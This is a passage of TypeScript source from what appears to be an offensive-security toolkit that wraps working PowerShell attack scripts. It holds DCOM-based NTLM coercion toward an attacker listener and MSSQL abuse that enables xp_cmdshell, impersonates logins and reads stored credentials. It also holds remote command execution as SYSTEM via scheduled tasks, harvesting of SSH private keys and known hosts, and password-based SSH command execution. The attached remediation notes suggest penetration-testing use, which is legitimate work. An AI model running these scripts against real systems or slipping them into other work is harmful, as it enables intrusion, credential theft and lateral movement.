    Write-Output "[+] DCOM connection established to IMAPI2FS.MsftFileSystemImage"

    $dcom.VolumeName = "cs"

    # Set working directory to UNC path — forces auth
    try {
        $dcom.WorkingDirectory = "${uncPath}"
    } catch {}

    try {
        $dcom.CreateResultImage()
    } catch {}

    Write-Output "[+] FileSystemImage working directory set to: ${uncPath}"
    Write-Output "[+] NTLM auth should be coerced to ${listener}:${port}"
} catch {
    Write-Output "[-] FileSystemImage failed: $($_.Exception.Message)"
}
`,
    update: `
# Method 3: UpdateSession (Windows Update Agent)
Write-Output "[*] Method: UpdateSession (IUpdateSearcher)"
Write-Output "[*] Target: ${target}, Listener: ${listener}"

try {
    $dcom = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("Microsoft.Update.Session", "${target}"))
    Write-Output "[+] DCOM connection established to Microsoft.Update.Session"

    $searcher = $dcom.CreateUpdateSearcher()

    # Set custom service to point to attacker (forces auth)
    try {
        $manager = $dcom.CreateUpdateServiceManager()
        $manager.AddService2("CyberStrike", 2, "https://${listener}:${port}/wsus")
        Write-Output "[+] Custom update service registered: https://${listener}:${port}/wsus"
    } catch {
        Write-Output "[-] AddService2 failed: $($_.Exception.Message)"
    }

    # Try to search for updates — triggers connection to our server
    try {
        $searcher.ServerSelection = 3  # ssOthers
        $searchResult = $searcher.Search("IsInstalled=0")
    } catch {}

    Write-Output "[+] Update search triggered against attacker server"
    Write-Output "[+] NTLM auth should be coerced to ${listener}:${port}"
} catch {
    Write-Output "[-] UpdateSession failed: $($_.Exception.Message)"
}
`,
  }

  if (method === "all") {
    for (const [name, script] of Object.entries(methods)) {
      output.push(`\n--- ${name} ---`)
      const result = await ps(script, timeout)
      output.push(result.stdout)
      if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 200)}`)
    }
  } else {
    const script = methods[method]
    if (!script)
      return { output: `[!] Unknown method: ${method}. Use: datacollector, filesystem, update, all`, findings }
    const result = await ps(script, timeout)
    output.push(result.stdout)
  }

  findings.push({
    checkId: "WIN-RMON-001",
    provider: "windows",
    severity: "high",
    status: "COERCED",
    resource: `dcom://${target}`,
    title: `DCOM NTLM coercion attempted on ${target}`,
    details: `Remote Monologue via DCOM objects targeting ${target}. Listener: ${listener}:${port}. Method: ${method}. Check responder/ntlmrelayx for captured hashes`,
    remediation:
      "Disable unnecessary DCOM objects. Enable LDAP signing. Use EPA (Extended Protection for Authentication). Monitor DCOM activation events (10036) and anomalous SMB connections",
  })

  return { output: output.join("\n"), findings }
}

export async function mssqlAbuse(args: string[], timeout: number): Promise<HookResult> {
  const server = argVal(args, "--server")
  const command = argVal(args, "--command")
  const action = argVal(args, "--action") || "enum"
  const user = argVal(args, "--user")
  const password = argVal(args, "--password")
  const findings: Finding[] = []
  const output: string[] = [`[*] MSSQL exploitation on ${server} — action: ${action}\n`]

  if (!server) return { output: "[!] Required: --server HOST", findings }

  const connStr =
    user && password
      ? `Server=${server};User Id=${user};Password=${password};TrustServerCertificate=True;`
      : `Server=${server};Integrated Security=True;TrustServerCertificate=True;`

  const actions: Record<string, string> = {
    enum: `
$conn = New-Object System.Data.SqlClient.SqlConnection('${connStr}')
$conn.Open()
Write-Output "[+] Connected to ${server}"
$cmd = $conn.CreateCommand()

# Server info
$cmd.CommandText = "SELECT @@VERSION AS Version, SYSTEM_USER AS SystemUser, USER_NAME() AS DbUser, DB_NAME() AS CurrentDb, IS_SRVROLEMEMBER('sysadmin') AS IsSysadmin"
$rdr = $cmd.ExecuteReader()
while ($rdr.Read()) {
  Write-Output "    Version: $($rdr['Version'].ToString().Split("\`n")[0])"
  Write-Output "    System user: $($rdr['SystemUser'])"
  Write-Output "    DB user: $($rdr['DbUser'])"
  Write-Output "    Current DB: $($rdr['CurrentDb'])"
  Write-Output "    Sysadmin: $($rdr['IsSysadmin'])"
}
$rdr.Close()

# Databases
$cmd.CommandText = "SELECT name, state_desc FROM sys.databases"
$rdr = $cmd.ExecuteReader()
Write-Output "\`n[+] Databases:"
while ($rdr.Read()) { Write-Output "    $($rdr['name']) ($($rdr['state_desc']))" }
$rdr.Close()

# Logins
$cmd.CommandText = "SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G') ORDER BY name"
$rdr = $cmd.ExecuteReader()
Write-Output "\`n[+] Server logins:"
while ($rdr.Read()) { Write-Output "    $($rdr['name']) ($($rdr['type_desc']))$(if($rdr['is_disabled']){' [DISABLED]'})" }
$rdr.Close()

# xp_cmdshell status
$cmd.CommandText = "SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS Enabled FROM sys.configurations WHERE name = 'xp_cmdshell'"
$rdr = $cmd.ExecuteReader()
if ($rdr.Read()) { Write-Output "\`n[+] xp_cmdshell: $(if($rdr['Enabled'] -eq 1){'ENABLED'}else{'disabled'})" }
$rdr.Close()

$conn.Close()
`,
    exec: `
$conn = New-Object System.Data.SqlClient.SqlConnection('${connStr}')
$conn.Open()
$cmd = $conn.CreateCommand()
# Enable xp_cmdshell
$cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
try { $cmd.ExecuteNonQuery() | Out-Null; Write-Output "[+] xp_cmdshell enabled" } catch { Write-Output "[!] Could not enable xp_cmdshell: $_" }

$cmd.CommandText = "EXEC xp_cmdshell '${command?.replace(/'/g, "''") || "whoami"}'"
$rdr = $cmd.ExecuteReader()
Write-Output "[+] xp_cmdshell output:"
while ($rdr.Read()) { if ($rdr[0] -ne [DBNull]::Value) { Write-Output "    $($rdr[0])" } }
$rdr.Close()
$conn.Close()
`,
    links: `
$conn = New-Object System.Data.SqlClient.SqlConnection('${connStr}')
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "EXEC sp_linkedservers"
$rdr = $cmd.ExecuteReader()
Write-Output "[+] Linked servers:"
while ($rdr.Read()) { Write-Output "    $($rdr[0]) -> $($rdr[1]) ($($rdr[2]))" }
$rdr.Close()

# Try double-hop via linked servers
$cmd.CommandText = "SELECT name FROM sys.servers WHERE is_linked = 1"
$rdr = $cmd.ExecuteReader()
$linked = @()
while ($rdr.Read()) { $linked += $rdr[0].ToString() }
$rdr.Close()

foreach ($ls in $linked) {
  Write-Output "\`n[*] Testing linked server: $ls"
  try {
    $cmd.CommandText = "EXEC ('SELECT SYSTEM_USER AS [user], @@SERVERNAME AS [server]') AT [$ls]"
    $rdr = $cmd.ExecuteReader()
    if ($rdr.Read()) { Write-Output "    Executes as: $($rdr['user']) on $($rdr['server'])" }
    $rdr.Close()
  } catch { Write-Output "    [!] Failed: $_" }
}
$conn.Close()
`,
    impersonate: `
$conn = New-Object System.Data.SqlClient.SqlConnection('${connStr}')
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
$rdr = $cmd.ExecuteReader()
Write-Output "[+] Impersonable logins:"
$impersonable = @()
while ($rdr.Read()) { $impersonable += $rdr[0].ToString(); Write-Output "    $($rdr[0])" }
$rdr.Close()

foreach ($login in $impersonable) {
  Write-Output "\`n[*] Impersonating: $login"
  try {
    $cmd.CommandText = "EXECUTE AS LOGIN = '$login'; SELECT SYSTEM_USER AS ImpersonatedAs, IS_SRVROLEMEMBER('sysadmin') AS IsSysadmin; REVERT;"
    $rdr = $cmd.ExecuteReader()
    if ($rdr.Read()) { Write-Output "    Now: $($rdr['ImpersonatedAs']) (sysadmin: $($rdr['IsSysadmin']))" }
    $rdr.Close()
  } catch { Write-Output "    [!] Failed: $_" }
}
$conn.Close()
`,
    creds: `
$conn = New-Object System.Data.SqlClient.SqlConnection('${connStr}')
$conn.Open()
$cmd = $conn.CreateCommand()

# SQL Agent jobs (may contain credentials)
Write-Output "[+] SQL Agent jobs with command steps:"
$cmd.CommandText = "SELECT j.name, s.step_name, s.command FROM msdb.dbo.sysjobs j INNER JOIN msdb.dbo.sysjobsteps s ON j.job_id = s.job_id WHERE s.command IS NOT NULL"
try {
  $rdr = $cmd.ExecuteReader()
  while ($rdr.Read()) { Write-Output "    Job: $($rdr['name']) | Step: $($rdr['step_name']) | Cmd: $($rdr['command'].ToString().Substring(0, [Math]::Min(200, $rdr['command'].ToString().Length)))" }
  $rdr.Close()
} catch { Write-Output "    [!] Cannot read agent jobs: $_" }

# Linked server credentials
Write-Output "\`n[+] Linked server credentials:"
$cmd.CommandText = "SELECT s.name AS LinkedServer, ll.remote_name AS RemoteLogin FROM sys.servers s LEFT JOIN sys.linked_logins ll ON s.server_id = ll.server_id WHERE s.is_linked = 1"
try {
  $rdr = $cmd.ExecuteReader()
  while ($rdr.Read()) { Write-Output "    $($rdr['LinkedServer']) -> $($rdr['RemoteLogin'])" }
  $rdr.Close()
} catch {}

$conn.Close()
`,
  }

  const script = actions[action] || actions.enum
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+] Connected") || result.stdout.includes("[+] xp_cmdshell")) {
    findings.push({
      checkId: "WIN-LAT-006",
      provider: "windows",
      severity: "critical",
      status: action === "exec" ? "EXECUTED" : "ENUMERATED",
      resource: `mssql://${server}`,
      title: `MSSQL ${action} on ${server}`,
      details: action === "exec" ? `Command: ${command}` : `Action: ${action}`,
      remediation:
        "Disable xp_cmdshell, review linked servers, restrict IMPERSONATE, encrypt credentials in agent jobs",
    })
  }
  return { output: output.join("\n"), findings }
}

export async function schtaskExec(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const command = argVal(args, "--command")
  const user = argVal(args, "--user")
  const password = argVal(args, "--password")
  const taskName = argVal(args, "--name") || `CS_${Date.now().toString(36)}`
  const action = argVal(args, "--action") || (command ? "exec" : "enum")
  const findings: Finding[] = []
  const output: string[] = [`[*] Remote scheduled task execution — ${action}\n`]

  if (action === "enum") {
    if (!target) {
      output.push("[!] --target required for enum action")
      return { output: output.join("\n"), findings }
    }
    const cred = user && password ? `/RU "${user}" /RP "${password}"` : ""
    const script = `
Write-Output "=== Remote Scheduled Tasks on ${target} ==="
$ErrorActionPreference = 'SilentlyContinue'

Write-Output "[*] Enumerating tasks on ${target}..."
$result = schtasks.exe /Query /S "${target}" ${cred} /FO CSV /NH 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Output "[-] Cannot query tasks: $result"
    Write-Output "[*] Check credentials and network access"
    exit 1
}

$tasks = $result | ConvertFrom-Csv -Header TaskName,NextRun,Status
$running = $tasks | Where-Object { $_.Status -eq 'Running' }
$systemTasks = $tasks | Where-Object { $_.TaskName -match '\\\\Microsoft\\\\' }
$customTasks = $tasks | Where-Object { $_.TaskName -notmatch '\\\\Microsoft\\\\' -and $_.TaskName -ne 'TaskName' }

Write-Output "[*] Total tasks: $($tasks.Count)"
Write-Output "[*] Running: $($running.Count)"
Write-Output "[*] Custom (non-Microsoft): $($customTasks.Count)"
Write-Output ""

if ($customTasks) {
    Write-Output "[!] Custom tasks (potential persistence or targets):"
    foreach ($t in ($customTasks | Select-Object -First 20)) {
        Write-Output "    $($t.TaskName)  Status: $($t.Status)"
    }
}

Write-Output ""
Write-Output "[*] Testing task creation permission..."
$testResult = schtasks.exe /Create /S "${target}" ${cred} /TN "CS_PermTest" /TR "cmd /c echo test" /SC ONCE /ST 23:59 /F 2>&1
if ($LASTEXITCODE -eq 0) {
    Write-Output "[+] Task creation ALLOWED — lateral movement possible"
    schtasks.exe /Delete /S "${target}" ${cred} /TN "CS_PermTest" /F 2>$null
} else {
    Write-Output "[-] Task creation denied: $testResult"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-LAT-012",
      provider: "windows",
      severity: r.stdout.includes("ALLOWED") ? "high" : "info",
      status: "ENUMERATED",
      resource: `schtask://${target}`,
      title: `Remote scheduled task enumeration on ${target}`,
      details: r.stdout.substring(0, 500),
      remediation: "Restrict remote task scheduler access. Monitor Event ID 4698 (task creation) on remote hosts.",
    })
  }

  if (action === "exec") {
    if (!target || !command) {
      output.push("[!] --target and --command required for exec action")
      return { output: output.join("\n"), findings }
    }
    const cred = user && password ? `/RU "${user}" /RP "${password}"` : ""
    const script = `
Write-Output "=== Remote Scheduled Task Execution ==="
Write-Output "[*] Target: ${target}"
Write-Output "[*] Task: ${taskName}"
Write-Output "[*] Command: ${command}"
Write-Output ""

$outFile = "C:\\Windows\\Temp\\${taskName}.out"
$wrappedCmd = "cmd.exe /c ${command.replace(/"/g, '\\"')} > $outFile 2>&1"

Write-Output "[*] Step 1: Creating remote task..."
$create = schtasks.exe /Create /S "${target}" ${cred} /TN "${taskName}" /TR "$wrappedCmd" /SC ONCE /ST 00:00 /RU SYSTEM /F 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Output "[-] Task creation failed: $create"
    exit 1
}
Write-Output "[+] Task created: ${taskName}"

Write-Output "[*] Step 2: Running task..."
$run = schtasks.exe /Run /S "${target}" ${cred} /TN "${taskName}" 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Output "[-] Task execution failed: $run"
    schtasks.exe /Delete /S "${target}" ${cred} /TN "${taskName}" /F 2>$null
    exit 1
}
Write-Output "[+] Task started"

Write-Output "[*] Step 3: Waiting for completion..."
$maxWait = 30
for ($i = 0; $i -lt $maxWait; $i++) {
    Start-Sleep -Seconds 1
    $status = schtasks.exe /Query /S "${target}" ${cred} /TN "${taskName}" /FO CSV /NH 2>&1
    if ($status -match 'Ready') { break }
}

Write-Output "[*] Step 4: Retrieving output..."
$uncPath = "\\\\${target}\\C$\\Windows\\Temp\\${taskName}.out"
if (Test-Path $uncPath) {
    $taskOutput = Get-Content $uncPath -Raw
    Write-Output "[+] Command output:"
    Write-Output $taskOutput
    Remove-Item $uncPath -Force -ErrorAction SilentlyContinue
} else {
    Write-Output "[*] Output file not accessible via UNC — try: type \\\\${target}\\C$\\Windows\\Temp\\${taskName}.out"
}

Write-Output "[*] Step 5: Cleanup..."
schtasks.exe /Delete /S "${target}" ${cred} /TN "${taskName}" /F 2>$null
Write-Output "[+] Task deleted"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-LAT-013",
      provider: "windows",
      severity: "critical",
      status: r.stdout.includes("Task started") ? "EXECUTED" : "FAILED",
      resource: `schtask://${target}/${taskName}`,
      title: `Remote command execution via scheduled task on ${target}`,
      details: `Command: ${command}`,
      remediation: "Restrict remote task scheduler. Monitor Event ID 4698/4702. Disable remote task creation for non-admin users.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function sshExec(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const command = argVal(args, "--command")
  const user = argVal(args, "--user")
  const password = argVal(args, "--password")
  const keyFile = argVal(args, "--key")
  const action = argVal(args, "--action") || (command ? "exec" : "enum")
  const findings: Finding[] = []
  const output: string[] = [`[*] SSH lateral movement — ${action}\n`]

  if (action === "enum") {
    const script = `
Write-Output "=== SSH Service Discovery ==="
$ErrorActionPreference = 'SilentlyContinue'

Write-Output "[*] Local SSH client:"
$sshExe = Get-Command ssh.exe -ErrorAction SilentlyContinue
if ($sshExe) {
    Write-Output "[+] ssh.exe found: $($sshExe.Source)"
    $ver = & ssh.exe -V 2>&1
    Write-Output "    Version: $ver"
} else {
    Write-Output "[-] ssh.exe not in PATH"
    $builtIn = "$env:SystemRoot\\System32\\OpenSSH\\ssh.exe"
    if (Test-Path $builtIn) {
        Write-Output "[+] Built-in OpenSSH found: $builtIn"
    } else {
        Write-Output "[-] OpenSSH not installed"
    }
}

Write-Output ""
Write-Output "[*] Local SSH server (sshd) status:"
$sshdService = Get-Service sshd -ErrorAction SilentlyContinue
if ($sshdService) {
    Write-Output "[+] sshd service: $($sshdService.Status) (StartType: $($sshdService.StartType))"
} else {
    Write-Output "[-] sshd service not installed"
}

$capability = Get-WindowsCapability -Online -Name "OpenSSH*" -ErrorAction SilentlyContinue
if ($capability) {
    Write-Output ""
    Write-Output "[*] OpenSSH capabilities:"
    foreach ($cap in $capability) {
        Write-Output "    $($cap.Name): $($cap.State)"
    }
}

Write-Output ""
Write-Output "=== SSH Keys and Known Hosts ==="
$sshDir = "$env:USERPROFILE\\.ssh"
if (Test-Path $sshDir) {
    Write-Output "[+] SSH directory: $sshDir"
    Get-ChildItem $sshDir -ErrorAction SilentlyContinue | ForEach-Object {
        $perm = if ($_.Name -match 'id_' -and $_.Name -notmatch '\.pub$') { '[!!! PRIVATE KEY]' } else { '' }
        Write-Output "    $($_.Name) ($([math]::Round($_.Length/1KB, 1)) KB) $perm"
    }

    if (Test-Path "$sshDir\\known_hosts") {
        Write-Output ""
        Write-Output "[*] Known hosts (potential lateral movement targets):"
        $knownHosts = Get-Content "$sshDir\\known_hosts" -ErrorAction SilentlyContinue
        $hosts = $knownHosts | ForEach-Object { ($_ -split ' ')[0] -split ',' } | Sort-Object -Unique | Select-Object -First 20
        foreach ($h in $hosts) {
            Write-Output "    $h"
        }
    }

    if (Test-Path "$sshDir\\config") {
        Write-Output ""
        Write-Output "[*] SSH config entries:"
        $config = Get-Content "$sshDir\\config" -ErrorAction SilentlyContinue
        $config | Select-String "^Host |HostName |User |IdentityFile " | ForEach-Object {
            Write-Output "    $($_.Line.Trim())"
        }
    }
} else {
    Write-Output "[-] No .ssh directory found"
}

Write-Output ""
Write-Output "=== Other Users SSH Keys ==="
$users = Get-ChildItem "C:\\Users" -Directory -ErrorAction SilentlyContinue
foreach ($u in $users) {
    $otherSsh = "$($u.FullName)\\.ssh"
    if ((Test-Path $otherSsh) -and ($u.Name -ne $env:USERNAME)) {
        Write-Output "[!] $($u.Name) has .ssh directory:"
        Get-ChildItem $otherSsh -ErrorAction SilentlyContinue | ForEach-Object {
            Write-Output "    $($_.Name)"
        }
    }
}

$adminKeys = "$env:ProgramData\\ssh\\administrators_authorized_keys"
if (Test-Path $adminKeys) {
    Write-Output ""
    Write-Output "[!] Admin authorized_keys: $adminKeys"
    $keyCount = (Get-Content $adminKeys).Count
    Write-Output "    Keys: $keyCount"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-LAT-010",
      provider: "windows",
      severity: r.stdout.includes("PRIVATE KEY") ? "high" : "info",
      status: "ENUMERATED",
      resource: "ssh://local",
      title: "SSH client/server discovery, key enumeration, and known hosts mapping",
      details: r.stdout.substring(0, 500),
      remediation: "Protect SSH private keys with passphrases. Restrict .ssh directory permissions. Disable password authentication.",
    })
  }

  if (action === "exec") {
    if (!target || !command) {
      output.push("[!] --target and --command required for exec action")
      return { output: output.join("\n"), findings }
    }
    const authArg = keyFile ? `-i "${keyFile}" -o StrictHostKeyChecking=no` : `-o StrictHostKeyChecking=no`
    const userArg = user ? `${user}@${target}` : target
    const script = password
      ? `
Write-Output "[*] SSH exec with password to ${target}..."
Write-Output "[*] Note: password auth via sshpass or expect-like approach"

$sshExe = Get-Command ssh.exe -ErrorAction SilentlyContinue
if (-not $sshExe) {
    Write-Output "[-] ssh.exe not found"
    exit 1
}

Write-Output "[*] Attempting: ssh ${authArg} ${userArg} '${command}'"
$env:SSH_ASKPASS_REQUIRE = "force"
$askPassScript = "$env:TEMP\\cs-askpass.cmd"
Set-Content $askPassScript "@echo ${password}" -Force
$env:SSH_ASKPASS = $askPassScript
$env:DISPLAY = ":0"

$result = & ssh.exe ${authArg} -o BatchMode=no -o PasswordAuthentication=yes ${userArg} "${command}" 2>&1
Write-Output $result

Remove-Item $askPassScript -Force -ErrorAction SilentlyContinue
$env:SSH_ASKPASS = $null
$env:SSH_ASKPASS_REQUIRE = $null
`
      : `
Write-Output "[*] SSH exec with key auth to ${target}..."

$sshExe = Get-Command ssh.exe -ErrorAction SilentlyContinue
if (-not $sshExe) {
    Write-Output "[-] ssh.exe not found"
    exit 1
}

Write-Output "[*] Executing: ssh ${authArg} ${userArg} '${command}'"
$result = & ssh.exe ${authArg} -o BatchMode=yes ${userArg} "${command}" 2>&1
Write-Output $result
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-LAT-011",
      provider: "windows",
      severity: "high",
      status: r.exitCode === 0 ? "EXECUTED" : "FAILED",
      resource: `ssh://${target}`,
      title: `SSH remote command execution on ${target}`,
      details: `Command: ${command}`,
      remediation: "Restrict SSH access. Use key-based auth with passphrases. Enable SSH audit logging.",
    })
  }

  return { output: output.join("\n"), findings }
}
